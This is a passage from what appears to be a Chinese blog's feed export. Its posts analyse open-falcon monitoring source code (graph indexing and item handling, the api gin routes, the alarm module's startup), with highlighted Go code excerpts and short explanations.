exiting..."</span>)</span><br><span class="line">listener.Close()</span><br><span class="line">Close_done_chan &lt;- <span class="number">1</span></span><br><span class="line"></span><br><span class="line">connects.Lock()</span><br><span class="line"><span class="keyword">for</span> e := connects.list.Front(); e != <span class="literal">nil</span>; e = e.Next() &#123;</span><br><span class="line">e.Value.(net.Conn).Close()</span><br><span class="line">&#125;</span><br><span class="line">connects.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来初始化内存索引信息：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Start</span><span class="params">()</span></span> &#123;</span><br><span class="line">InitCache()   <span class="comment">//初始化缓存cache统计信息</span></span><br><span class="line"><span class="keyword">go</span> StartIndexUpdateIncrTask()   <span class="comment">//更新索引任务</span></span><br><span class="line">log.Debug(<span class="string">"index.Start ok"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 启动索引的 异步、增量更新 任务, 每隔一定时间，刷新cache中的数据到数据库中</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">StartIndexUpdateIncrTask</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">time.Sleep(IndexUpdateIncrTaskSleepInterval)</span><br><span class="line">startTs := time.Now().Unix()</span><br><span class="line">cnt := updateIndexIncr()</span><br><span class="line">endTs := time.Now().Unix()</span><br><span class="line"><span class="comment">// statistics</span></span><br><span class="line">proc.IndexUpdateIncrCnt.SetCnt(<span class="keyword">int64</span>(cnt))</span><br><span class="line">proc.IndexUpdateIncr.Incr()</span><br><span class="line">proc.IndexUpdateIncr.PutOther(<span class="string">"lastStartTs"</span>, ntime.FormatTs(startTs))</span><br><span class="line">proc.IndexUpdateIncr.PutOther(<span class="string">"lastTimeConsumingInSec"</span>, endTs-startTs)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要针对一些收集到的指标数据更新到数据库中。方便后续查询和报警使用：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 进行一次增量更新</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">updateIndexIncr</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">ret := <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> unIndexedItemCache == <span class="literal">nil</span> || unIndexedItemCache.Size() &lt;= <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dbConn, err := g.GetDbConn(<span class="string">"UpdateIndexIncrTask"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Error(<span class="string">"[ERROR] get dbConn fail"</span>, err)</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">keys := unIndexedItemCache.Keys()</span><br><span class="line"><span class="keyword">for</span> _, key := <span class="keyword">range</span> keys &#123;</span><br><span class="line">icitem := unIndexedItemCache.Get(key)</span><br><span class="line">unIndexedItemCache.Remove(key)</span><br><span class="line"><span class="keyword">if</span> icitem != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// 并发更新mysql</span></span><br><span class="line">semaUpdateIndexIncr.Acquire()</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(key <span class="keyword">string</span>, icitem *IndexCacheItem, dbConn *sql.DB)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> semaUpdateIndexIncr.Release()</span><br><span class="line">err := updateIndexFromOneItem(icitem.Item, dbConn)  <span class="comment">// 更新数据到数据库</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">proc.IndexUpdateIncrErrorCnt.Incr()</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">IndexedItemCache.Put(key, icitem)</span><br><span class="line">&#125;</span><br><span class="line">&#125;(key, icitem.(*IndexCacheItem), dbConn)</span><br><span class="line">ret++</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>http服务启动</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Start</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> !g.Config().Http.Enabled &#123;</span><br><span class="line">log.Println(<span class="string">"http.Start warning, not enabled"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !g.Config().Debug &#123;</span><br><span class="line">gin.SetMode(gin.ReleaseMode)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router = gin.Default()</span><br><span class="line"></span><br><span class="line">configCommonRoutes()</span><br><span class="line">configProcRoutes()</span><br><span class="line">configIndexRoutes()</span><br><span class="line"></span><br><span class="line">router.GET(<span class="string">"/api/v2/counter/migrate"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">counter := rrdtool.GetCounterV2()</span><br><span class="line">log.Debug(<span class="string">"migrating counter v2:"</span>, fmt.Sprintf(<span class="string">"%+v"</span>, counter))</span><br><span class="line">c.JSON(<span class="number">200</span>, counter)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//compatible with open-falcon v0.1</span></span><br><span class="line">router.GET(<span class="string">"/counter/migrate"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">cnt := rrdtool.GetCounter()</span><br><span class="line">log.Debug(<span class="string">"migrating counter:"</span>, cnt)</span><br><span class="line">c.JSON(<span class="number">200</span>, gin.H&#123;<span class="string">"msg"</span>: <span class="string">"ok"</span>, <span class="string">"counter"</span>: cnt&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">addr := g.Config().Http.Listen</span><br><span class="line"><span class="keyword">if</span> addr == <span class="string">""</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> router.Run(addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-Close_chan:</span><br><span class="line">log.Info(<span class="string">"http recv sigout and exit..."</span>)</span><br><span class="line">Close_done_chan &lt;- <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定时清理无效数据</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CleanCache</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">ticker := time.NewTicker(time.Duration(g.CLEAN_CACHE) * time.Second)</span><br><span class="line"><span class="keyword">defer</span> ticker.Stop()</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">&lt;-ticker.C</span><br><span class="line">DeleteInvalidItems()   <span class="comment">// 删除无效的GraphItems</span></span><br><span class="line">DeleteInvalidHistory() <span class="comment">// 删除无效的HistoryCache</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来还是看下graph是如何存储数据的：</p><p>接收数据函数是在handleItem函数中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleItems</span><span class="params">(items []*cmodel.GraphItem)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> items == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count := <span class="built_in">len</span>(items)</span><br><span class="line"><span class="keyword">if</span> count == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cfg := g.Config()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; count; i++ &#123;</span><br><span class="line"><span class="keyword">if</span> items[i] == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">endpoint := items[i].Endpoint</span><br><span class="line"><span class="keyword">if</span> !g.IsValidString(endpoint) &#123;</span><br><span class="line">log.Debugf(<span class="string">"invalid endpoint: %s"</span>, endpoint)</span><br><span class="line">pfc.Meter(<span class="string">"invalidEnpoint"</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">counter := cutils.Counter(items[i].Metric, items[i].Tags)</span><br><span class="line"><span class="keyword">if</span> !g.IsValidString(counter) &#123;</span><br><span class="line">log.Debugf(<span class="string">"invalid counter: %s/%s"</span>, endpoint, counter)</span><br><span class="line">pfc.Meter(<span class="string">"invalidCounter"</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dsType := items[i].DsType</span><br><span class="line">step := items[i].Step</span><br><span class="line">checksum := items[i].Checksum()</span><br><span class="line">key := g.FormRrdCacheKey(checksum, dsType, step)</span><br><span class="line"></span><br><span class="line"><span class="comment">//statistics</span></span><br><span class="line">proc.GraphRpcRecvCnt.Incr()</span><br><span class="line"></span><br><span class="line"><span class="comment">// To Graph</span></span><br><span class="line">first := store.GraphItems.First(key)</span><br><span class="line"><span class="keyword">if</span> first != <span class="literal">nil</span> &amp;&amp; items[i].Timestamp &lt;= first.Timestamp &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// 放入缓存队列</span></span><br><span class="line">store.GraphItems.PushFront(key, items[i], checksum, cfg)</span><br><span class="line"></span><br><span class="line"><span class="comment">// To Index</span></span><br><span class="line">index.ReceiveItem(items[i], checksum)</span><br><span class="line"></span><br><span class="line"><span class="comment">// To History</span></span><br><span class="line">store.AddItem(checksum, items[i])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接收到数据先放到缓存队列，然后写入rrd磁盘或者写入到数据库中完成存档。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;open-falcon-graph源码分析&quot;&gt;&lt;a href=&quot;#open-falcon-graph源码分析&quot; class=&quot;headerlink&quot; title=&quot;open-falcon graph源码分析&quot;&gt;&lt;/a&gt;open-falcon graph源码分析&lt;/
      
    
    </summary>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/categories/monitor/"/>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/tags/monitor/"/>
    
  </entry>
  
  <entry>
    <title>open-falcon api 源码分析</title>
    <link href="http://www.mydreamdll.xyz/2020/01/21/api%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://www.mydreamdll.xyz/2020/01/21/api%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-01-21T09:07:43.700Z</published>
    <updated>2020-01-21T09:05:48.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open-falcon-api源码分析"><a href="#open-falcon-api源码分析" class="headerlink" title="open-falcon api源码分析"></a>open-falcon api源码分析</h2><p>主流程在module/api/main</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">config.BinaryName = BinaryName</span><br><span class="line">config.Version = Version</span><br><span class="line">config.GitCommit = GitCommit</span><br><span class="line"></span><br><span class="line">cfgTmp := flag.String(<span class="string">"c"</span>, <span class="string">"cfg.json"</span>, <span class="string">"configuration file"</span>)</span><br><span class="line">version := flag.Bool(<span class="string">"v"</span>, <span class="literal">false</span>, <span class="string">"show version"</span>)</span><br><span class="line">help := flag.Bool(<span class="string">"h"</span>, <span class="literal">false</span>, <span class="string">"help"</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line">cfg := *cfgTmp</span><br><span class="line"><span class="keyword">if</span> *version &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Open-Falcon %s version %s, build %s\n"</span>, BinaryName, Version, GitCommit)</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *help &#123;</span><br><span class="line">flag.Usage()</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">viper.AddConfigPath(<span class="string">"."</span>)</span><br><span class="line">viper.AddConfigPath(<span class="string">"/"</span>)</span><br><span class="line">viper.AddConfigPath(<span class="string">"./config"</span>)</span><br><span class="line">viper.AddConfigPath(<span class="string">"./api/config"</span>)</span><br><span class="line">cfg = strings.Replace(cfg, <span class="string">".json"</span>, <span class="string">""</span>, <span class="number">1</span>)</span><br><span class="line">viper.SetConfigName(cfg)</span><br><span class="line"></span><br><span class="line">err := viper.ReadInConfig()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 日志初始化</span></span><br><span class="line">err = config.InitLog(viper.GetString(<span class="string">"log_level"</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//初始化数据</span></span><br><span class="line">err = config.InitDB(viper.GetBool(<span class="string">"db.db_bug"</span>), viper.GetViper())</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">"db conn failed with error %s"</span>, err.Error())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> viper.GetString(<span class="string">"log_level"</span>) != <span class="string">"debug"</span> &#123;</span><br><span class="line">gin.SetMode(gin.ReleaseMode)</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// gin初始化</span></span><br><span class="line">routes := gin.Default()</span><br><span class="line"><span class="keyword">if</span> viper.GetBool(<span class="string">"gen_doc"</span>) &#123;</span><br><span class="line">yaag.Init(&amp;yaag.Config&#123;</span><br><span class="line">On:       <span class="literal">true</span>,</span><br><span class="line">DocTitle: <span class="string">"Gin"</span>,</span><br><span class="line">DocPath:  viper.GetString(<span class="string">"gen_doc_path"</span>),</span><br><span class="line">BaseUrls: <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;<span class="string">"Production"</span>: <span class="string">"/api/v1"</span>, <span class="string">"Staging"</span>: <span class="string">"/api/v1"</span>&#125;,</span><br><span class="line">&#125;)</span><br><span class="line">routes.Use(yaag_gin.Document())</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//启动graph服务，启动服务一致性hash</span></span><br><span class="line">initGraph()</span><br><span class="line"><span class="comment">//start gin server</span></span><br><span class="line">log.Debugf(<span class="string">"will start with port:%v"</span>, viper.GetString(<span class="string">"web_port"</span>))</span><br><span class="line"><span class="keyword">go</span> controller.StartGin(viper.GetString(<span class="string">"web_port"</span>), routes)</span><br><span class="line"></span><br><span class="line">sigs := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">1</span>)</span><br><span class="line">signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">&lt;-sigs</span><br><span class="line">fmt.Println()</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;()</span><br><span class="line"><span class="keyword">select</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>initGraph函数中启动graph服务</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Start</span><span class="params">(addrs <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">clusterMap = addrs</span><br><span class="line">connTimeout = <span class="keyword">int32</span>(viper.GetInt(<span class="string">"graphs.conn_timeout"</span>))</span><br><span class="line">callTimeout = <span class="keyword">int32</span>(viper.GetInt(<span class="string">"graphs.call_timeout"</span>))</span><br><span class="line"><span class="keyword">for</span> c := <span class="keyword">range</span> clusterMap &#123;</span><br><span class="line">gcluster = <span class="built_in">append</span>(gcluster, c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> r := <span class="built_in">recover</span>(); r != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Errorf(<span class="string">"graph got painc:%v"</span>, r)</span><br><span class="line">Start(clusterMap)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">initNodeRings(clusterMap)  <span class="comment">//初始化一致性hash</span></span><br><span class="line">initConnPools(clusterMap)  <span class="comment">//初始化rpc连接池</span></span><br><span class="line">log.Println(<span class="string">"graph.Start ok"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>StartGin注册路由并启动：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">StartGin</span><span class="params">(port <span class="keyword">string</span>, r *gin.Engine)</span></span> &#123;</span><br><span class="line">r.Use(utils.CORS())</span><br><span class="line">r.GET(<span class="string">"/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.String(http.StatusOK, <span class="string">"Hello, I'm Falcon+ (｡A｡)"</span>)</span><br><span class="line">&#125;)</span><br><span class="line">graph.Routes(r)</span><br><span class="line">uic.Routes(r)</span><br><span class="line">template.Routes(r)</span><br><span class="line">strategy.Routes(r)</span><br><span class="line">host.Routes(r)</span><br><span class="line">expression.Routes(r)</span><br><span class="line">mockcfg.Routes(r)</span><br><span class="line">dashboard_graph.Routes(r)</span><br><span class="line">dashboard_screen.Routes(r)</span><br><span class="line">alarm.Routes(r)</span><br><span class="line">r.Run(port)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这边api主要是在gin中注册信息，提供增删改查的功能，具体可能需要仔细去看下了。详细的这边就不描述了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;open-falcon-api源码分析&quot;&gt;&lt;a href=&quot;#open-falcon-api源码分析&quot; class=&quot;headerlink&quot; title=&quot;open-falcon api源码分析&quot;&gt;&lt;/a&gt;open-falcon api源码分析&lt;/h2&gt;&lt;p&gt;主流
      
    
    </summary>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/categories/monitor/"/>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/tags/monitor/"/>
    
  </entry>
  
  <entry>
    <title>open-falcon alarm 源码分析</title>
    <link href="http://www.mydreamdll.xyz/2020/01/21/alarm%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://www.mydreamdll.xyz/2020/01/21/alarm%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-01-21T09:07:42.964Z</published>
    <updated>2020-01-21T09:04:29.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open-falcon-alarm-源码分析"><a href="#open-falcon-alarm-源码分析" class="headerlink" title="open-falcon alarm 源码分析"></a>open-falcon alarm 源码分析</h2><p>主函数在modules/alarm/main中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">g.BinaryName = BinaryName</span><br><span class="line">g.Version = Version</span><br><span class="line">g.GitCommit = GitCommit</span><br><span class="line"></span><br><span class="line">cfg := flag.String(<span class="string">"c"</span>, <span class="string">"cfg.json"</span>, <span class="string">"configuration file"</span>)</span><br><span class="line">version := flag.Bool(<span class="string">"v"</span>, <span class="literal">false</span>, <span class="string">"show version"</span>)</span><br><span class="line">help := flag.Bool(<span class="string">"h"</span>, <span class="literal">false</span>, <span class="string">"help"</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *version &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Open-Falcon %s version %s, build %s\n"</span>, BinaryName, Version, GitCommit)</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *help &#123;</span><br><span class="line">flag.Usage()</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">g.ParseConfig(*cfg)</span><br><span class="line"></span><br><span class="line">g.InitLog(g.Config().LogLevel)</span><br><span class="line"><span class="keyword">if</span> g.Config().LogLevel != <span class="string">"debug"</span> &#123;</span><br><span class="line">gin.SetMode(gin.ReleaseMode)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//初始化redis连接池</span></span><br><span class="line">g.InitRedisConnPool()</span><br><span class="line">    <span class="comment">// 初始化数据库</span></span><br><span class="line">model.InitDatabase()</span><br><span class="line">    <span class="comment">// 启动定时发送channel</span></span><br><span class="line">cron.InitSenderWorker()</span><br><span class="line"><span class="comment">// 启动http服务</span></span><br><span class="line"><span class="keyword">go</span> http.Start()</span><br><span class="line">    <span class="comment">// 定时读取highevent</span></span><br><span class="line"><span class="keyword">go</span> cron.ReadHighEvent()</span><br><span class="line">    <span class="comment">// 定时读取lowevent</span></span><br><span class="line"><span class="keyword">go</span> cron.ReadLowEvent()</span><br><span class="line">    <span class="comment">// 组装Mail信息，群发功能</span></span><br><span class="line"><span class="keyword">go</span> cron.CombineSms()</span><br><span class="line"><span class="keyword">go</span> 